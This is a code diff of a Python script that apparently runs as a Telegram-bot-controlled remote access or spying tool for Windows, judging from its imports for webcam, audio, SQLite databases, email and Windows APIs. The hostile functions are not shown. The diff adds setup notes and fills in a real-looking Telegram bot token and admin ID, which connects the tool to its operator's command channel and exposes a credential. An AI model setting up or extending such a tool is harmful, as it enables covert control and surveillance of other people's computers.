@@ -1,4 +1,12 @@
     # -*- coding: utf8 -*-
+'''
+pip install opencv-python
+pip3 install python-opencv
+pip3 install pytelegrambotapi
+pip3 install pypiwin32
+pip3 install pyaudio
+pip install pillow
+'''
 
 import os
 import sys
@@ -13,7 +21,7 @@ import smtplib
 import sqlite3
 import telebot
 import zipfile
-import pyaudio
+#import pyaudio
 import requests
 import platform
 import webbrowser
@@ -24,8 +32,8 @@ from telebot import util
 from ctypes import *
 from ctypes.wintypes import *
 
-token = ' '
-adm = ' '
+token = '5258452459:AAF7Zb0XmlaUIEzOUxrj659M8G7JVdS36yE'
+adm = '1960249681'
 bot = telebot.TeleBot(token)
 
 menu = types.ReplyKeyboardMarkup()
